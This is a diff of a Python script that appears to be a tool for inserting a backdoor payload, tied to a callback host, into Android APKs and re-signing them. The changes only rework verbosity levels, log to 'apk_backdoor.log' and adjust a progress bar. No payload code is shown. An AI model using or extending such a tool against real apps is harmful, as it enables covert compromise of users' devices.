@@ -63,18 +63,17 @@ def setup_args():
         '-V', '--verbose',
         dest='verbosity',
         action='count',
-        default=5,
+        default=0,
         help='Verbosity level (between 1 and 5 occurrences with '
              'more leading to a more verbose logging). '
-             'CRITICAL = 1, ERROR = 2, WARN = 3, INFO = 4, DEBUG = 5.'
-             'The default (no option) is DEBUG.'
+             'CRITICAL = 0, ERROR = 1, WARN = 2, INFO = 3, DEBUG = 4.'
     )
     log_levels = {
-        1: logging.CRITICAL,
-        2: logging.ERROR,
-        3: logging.WARN,
-        4: logging.INFO,
-        5: logging.DEBUG,
+        0: logging.CRITICAL,
+        1: logging.ERROR,
+        2: logging.WARN,
+        3: logging.INFO,
+        4: logging.DEBUG,
     }
 
     args = parser.parse_args()
@@ -89,10 +88,8 @@ def main():
     ]
 
     args = setup_args()
-    progressbar.streams.wrap_stderr()
-    progressbar.streams.wrap_stdout()
-    logging.basicConfig(level=args.verbosity)
-    progress = progressbar.ProgressBar(max_value=5, widgets=widgets)
+    logging.basicConfig(level=args.verbosity, filename='apk_backdoor.log')
+    progress = progressbar.ProgressBar(max_value=6, widgets=widgets, redirect_stdout=True)
     progress.update(0)
 
     payload = Payload(args.host, args.public_host)
@@ -108,3 +105,4 @@ def main():
     apk.sign()
     progress.update(5)
     apk.remove_decompiled()
+    progress.update(6)
